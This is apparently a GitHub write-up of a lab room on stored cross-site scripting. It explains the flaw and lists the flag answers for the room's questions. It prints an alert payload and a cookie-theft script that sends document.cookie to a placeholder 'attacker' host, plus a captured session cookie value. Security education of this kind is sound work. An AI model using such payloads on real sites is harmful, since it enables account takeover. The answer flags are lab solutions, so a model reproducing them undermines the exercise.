# Stored XSS

**To see which HTML/JavaScript payloads are being used to do the task please refer [this folder](https://github.com/ShubhamJagtap2000/Cross-site-Scripting/tree/main/04%20-%20Stored%20XSS/Sample%20Payloads).** <br>
- Stored cross-site scripting is the most dangerous type of XSS. This is where a malicious string originates from the website's database. This often happens when a website allows user input that is ***not sanitised*** (remove the **"bad parts"** of a user's input) when inserted into the database.
   
  ![Screenshot (820)](https://user-images.githubusercontent.com/63872951/183843240-6955d1d5-1a23-42e6-8be3-67dbf8544db7.png)
 
- A attacker creates a payload in a field when signing up to a website that is stored in the websites database. 
- If the website doesn't properly sanitise that field, when the site displays that field on the page, it will execute the payload **to everyone** who visits it. 
- The payload could be as simple as `<script>alert(1)</script>`
- However, this payload won't just execute in your browser but any other browsers that display the malicious data inserted into the database.


# Answer the questions below

- The machine you deployed earlier will guide you though exploiting some cool vulnerabilities, stored XSS has to offer. There are hints for answering these questions on the machine.

1. Add a comment and see if you can insert some of your own HTML.

Doing so will reveal the answer to this question.
```
HTML_T4gs
```
2. Create an alert popup box appear on the page with your document cookies.
```
W3LL_D0N3_LVL2
```
3. Change "XSS Playground" to "I am a hacker" by adding comments and using Javascript.
```
websites_can_be_easily_defaced_with_xss
```
4. Stored XSS can be used to steal a victims cookie (data on a machine that authenticates a user to a webserver). This can be done by having a victims browser parse the following Javascript code:

   ```js
   <script>window.location='http://attacker/?cookie='+document.cookie</script>
   ```

   This script navigates the users browser to a different URL, this new request will includes a victims cookie as a query parameter. When the attacker has acquired the cookie, they can use it to impersonate the victim. 

   Take over Jack's account by stealing his cookie, what was his cookie value?
```
s%3Aat0YYHmITnfNSF0kM5Ne-ir1skTX3aEU.yj1%2FXoaxe7cCjUYmfgQpW3o5wP3O8Ae7YNHnHPJIasE
```
5. Post a comment as Jack.
```
c00ki3_stealing_
```

# The Next Steps

- Click **[here](https://github.com/ShubhamJagtap2000/Cross-site-Scripting/tree/main/04%20-%20Stored%20XSS/Stored%20XSS%20Approach)** to see how to move further in a stored XSS attack.

# Scripts used to exploit

- Click below to see which scripts/payloads were used in finding the answers to complete this task:

   - [Question 2](https://github.com/ShubhamJagtap2000/Cross-site-Scripting/blob/main/04%20-%20Stored%20XSS/Used%20Payloads/1%20-%20Q2.html)
   - [Question 3](https://github.com/ShubhamJagtap2000/Cross-site-Scripting/blob/main/04%20-%20Stored%20XSS/Used%20Payloads/2%20-%20Q3.js)
   - [Question 4](https://github.com/ShubhamJagtap2000/Cross-site-Scripting/blob/main/04%20-%20Stored%20XSS/Used%20Payloads/3%20-%20Q4.js)
 
